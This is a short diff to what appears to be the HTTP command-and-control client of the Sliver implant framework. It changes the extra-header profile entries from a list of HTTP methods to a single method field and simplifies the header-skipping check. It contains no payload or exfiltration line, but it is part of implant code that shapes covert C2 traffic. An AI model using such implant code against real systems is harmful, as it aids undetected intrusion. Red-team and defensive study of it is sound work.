@@ -238,7 +238,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 		Name        string
 		Value       string
 		Probability string
-		Methods     []string
+		Method      string
 	}
 
 	// HTTP C2 Profile headers
@@ -248,20 +248,15 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 			Name:        "{{$header.Name}}",
 			Value:       "{{$header.Value}}",
 			Probability: "{{$header.Probability}}",
-			Methods: []string{
-				// {{range $method := $header.Methods}}
-				"{{$method}}",
-				// {{end}}
-			},
+			Method:      "{{$header.Method}}",
 		},
 		// {{end}}
 	}
+
 	for _, header := range extraHeaders {
-		// Empty array means all methods (backwards compatibility)
-		if len(header.Methods) > 0 {
-			if !contains(header.Methods, method) {
-				continue
-			}
+
+		if len(header.Method) > 0 && header.Method != method {
+			continue
 		}
 		// {{if .Config.Debug}}
 		log.Printf("Rolling to add HTTP header '%s: %s' (%s)", header.Name, header.Value, header.Probability)
